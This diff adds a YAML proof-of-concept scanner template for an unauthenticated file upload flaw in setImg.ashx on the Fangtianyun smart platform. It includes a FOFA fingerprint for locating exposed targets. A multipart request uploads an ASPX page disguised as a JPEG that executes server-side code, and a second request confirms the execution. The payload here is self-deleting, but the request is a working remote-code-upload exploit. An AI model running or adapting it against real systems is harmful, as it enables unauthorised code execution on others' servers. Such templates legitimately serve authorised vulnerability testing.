@@ -1,0 +1,47 @@
+id: poc-yaml-ftyerp-setImg-upload
+info:
+  name: 方天云智慧平台系统setImg.ashx存在文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: ftyerp
+  fofa: body="AjaxMethods.asmx/GetCompanyItem"
+variables:
+  t1: random_int(100,1000)
+  t2: random_int(100,1000)
+  t3: t1 * t2
+requests:
+- method: POST
+  path: /Data/setImg.ashx
+  headers:
+    X-Requested-With: XMLHttpRequest
+    Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
+  data: '------21909179191068471382830692394
+
+    Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
+
+    Content-Type: image/jpeg
+
+
+    <%@ Page Language="Jscript" validateRequest="false" %>
+
+    This website has a vulnerability
+
+    <%Response.Write({{.t1}} * {{.t2}});System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
+
+    ------21909179191068471382830692394--'
+  output:
+  - regex_match(body,"(?P<filepath>.*?).aspx")
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /UploadFile/CustomerFile/{{.filepath}}.aspx
+  expression: 'status_code == 200 &&
+
+    contains(body,"This website has a vulnerability") &&
+
+    contains(body,t3)
+
+    '
+transport: http
